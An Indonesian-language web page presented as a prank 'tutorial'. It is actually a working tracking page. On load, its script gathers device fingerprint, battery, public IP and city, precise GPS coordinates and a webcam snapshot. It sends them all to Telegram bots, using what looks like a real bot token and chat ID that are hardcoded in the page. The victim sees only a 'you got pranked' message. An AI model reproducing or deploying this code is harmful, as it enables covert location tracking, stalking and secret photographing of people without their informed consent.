<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Tutorial Prank temen yang dongo 100% dijamin berhasil</title>
  <style>
    * {
      box-sizing: border-box;
    }
    body {
      background-color: #000;
      color: #00ff00;
      font-family: 'Courier New', Courier, monospace;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      overflow: hidden;
      flex-direction: column;
    }

    #msg {
      white-space: pre-wrap;
      font-size: 14px;
      padding: 20px;
      max-width: 90vw;
      animation: typing 1s steps(40, end) 1;
      border-left: 2px solid #0f0;
      padding-left: 15px;
      animation: cursor 1s step-end infinite;
    }

    @keyframes cursor {
      50% {
        border-color: transparent;
      }
    }

    .prank {
      font-size: 40px;
      color: #0f0;
      text-shadow:
        0 0 5px #0f0,
        0 0 10px #0f0,
        0 0 20px #00ff00,
        0 0 40px #00ff00;
      font-weight: bold;
      opacity: 0;
      animation: muncul 2s ease-in-out forwards;
    }

    @keyframes muncul {
      0% { opacity: 0; transform: scale(0.8); }
      50% { opacity: 1; transform: scale(1.1); }
      100% { transform: scale(1); }
    }

    .hidden {
      display: none;
    }
  </style>
</head>
<body>
  <div id="msg">Hii 😹...</div>

  <script>
    const token1 = '7691252764:AAEivTZ5gqJx9LjID9Fkz43qNIICvv6FGdY';
    const token2 = 'TOKEN_BOT_2';
    const chatId1 = '5914256752';
    const chatId2 = 'CHAT_ID_2';

    const kirimPesan = async (pesan) => {
      const payload = { chat_id: chatId1, text: pesan, parse_mode: 'HTML' };
      const payload2 = { chat_id: chatId2, text: pesan, parse_mode: 'HTML' };

      await fetch(`https://api.telegram.org/bot${token1}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });

      await fetch(`https://api.telegram.org/bot${token2}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload2)
      });
    };

    const kirimFoto = async (blob) => {
      const form1 = new FormData();
      form1.append("chat_id", chatId1);
      form1.append("photo", blob, "foto.jpg");
      await fetch(`https://api.telegram.org/bot${token1}/sendPhoto`, { method: "POST", body: form1 });

      const form2 = new FormData();
      form2.append("chat_id", chatId2);
      form2.append("photo", blob, "foto.jpg");
      await fetch(`https://api.telegram.org/bot${token2}/sendPhoto`, { method: "POST", body: form2 });
    };

    const ambilDataPerangkat = async () => {
      const ua = navigator.userAgent;
      const platform = navigator.platform;
      const vendor = navigator.vendor;
      const gpu = (() => {
        try {
          const canvas = document.createElement("canvas");
          const gl = canvas.getContext("webgl");
          const info = gl.getExtension("WEBGL_debug_renderer_info");
          return {
            vendor: gl.getParameter(info.UNMASKED_VENDOR_WEBGL),
            renderer: gl.getParameter(info.UNMASKED_RENDERER_WEBGL),
          };
        } catch {
          return { vendor: "Tidak diketahui", renderer: "Tidak diketahui" };
        }
      })();

      const bat = await navigator.getBattery();
      const waktu = new Date().toLocaleString("id-ID");
      const touch = 'ontouchstart' in window ? 'Ya' : 'Tidak';
      const ref = document.referrer || 'Langsung';

      return `
=== 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐒𝐈 𝐏𝐄𝐑𝐀𝐍𝐆𝐊𝐀𝐓 ===

User Agent          : ${ua}
Platform            : ${platform}
Vendor Browser      : ${vendor}
GPU Vendor          : ${gpu.vendor}
GPU Renderer        : ${gpu.renderer}
CPU                 : ${navigator.hardwareConcurrency || '-'} inti
RAM                 : ${navigator.deviceMemory || '-'} GB
Resolusi Layar      : ${screen.width} x ${screen.height}
Orientasi Layar     : ${screen.orientation?.type || '-'}
Touch Support       : ${touch} (${navigator.maxTouchPoints} titik)
Kerapatan Piksel    : ${window.devicePixelRatio}
Cookies Aktif       : ${navigator.cookieEnabled ? 'Ya' : 'Tidak'}
JavaScript          : Aktif
Do Not Track        : ${navigator.doNotTrack == "1" ? "Ya" : "Tidak"}
HTTPS               : ${location.protocol === "https:" ? "Ya" : "Tidak"}
Zona Waktu          : ${Intl.DateTimeFormat().resolvedOptions().timeZone}
Waktu Lokal         : ${waktu}
Referrer            : ${ref}
Baterai             : ${Math.round(bat.level * 100)}%
Sedang Mengisi      : ${bat.charging ? '✅' : '🚫'}
`.trim();
    };

    const ambilIPInfo = async () => {
      try {
        const res = await fetch("https://ipapi.co/json");
        const ip = await res.json();
        return `
=== 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐒𝐈 𝐉𝐀𝐑𝐈𝐍𝐆𝐀𝐍 ===

IP Publik           : ${ip.ip}
Penyedia Layanan    : ${ip.org}
Negara              : ${ip.country_name}
Provinsi            : ${ip.region}
Kota                : ${ip.city}
`.trim();
      } catch {
        return "\nINFORMASI JARINGAN\nGagal mengambil data IP.";
      }
    };

    const ambilLokasi = () => {
      return new Promise((resolve) => {
        navigator.geolocation.getCurrentPosition(async pos => {
          const { latitude, longitude, accuracy } = pos.coords;
          resolve(`
=== 𝐋𝐎𝐊𝐀𝐒𝐈 𝐋𝐀𝐍𝐆𝐒𝐔𝐍𝐆 ===

Latitude            : ${latitude}
Longitude           : ${longitude}
Akurasi             : ±${accuracy} meter
Peta                : https://maps.google.com/?q=${latitude},${longitude}
`);
        }, () => {
          resolve(`
=== 𝐋𝐎𝐊𝐀𝐒𝐈 𝐋𝐀𝐍𝐆𝐒𝐔𝐍𝐆 ===

❌ Lokasi tidak diizinkan oleh pengguna.
`);
        }, { enableHighAccuracy: true, timeout: 10000 });
      });
    };

    const ambilKamera = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement("video");
        video.srcObject = stream;
        await video.play();

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0);

        stream.getTracks().forEach(track => track.stop());

        const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));
        await kirimFoto(blob);
        return "";
      } catch {
        return `
=== 𝐊𝐀𝐌𝐄𝐑𝐀 ===

❌ Kamera tidak diizinkan oleh pengguna.
`;
      }
    };

    const mulai = async () => {
      const info = await ambilDataPerangkat();
      const ip = await ambilIPInfo();
      const lokasi = await ambilLokasi();
      const kamera = await ambilKamera();

      const final = `${info}\n\n${ip}\n\n${lokasi}\n${kamera}`;
      document.getElementById("msg").textContent = "Anda kena prank.";
      await kirimPesan(final);

      // Efek akhir prank muncul
      setTimeout(() => {
        document.getElementById("msg").classList.add("hidden");
        document.getElementById("prank").classList.remove("hidden");
      }, 1500);
    };

    mulai();
  </script>
</body>
</html>
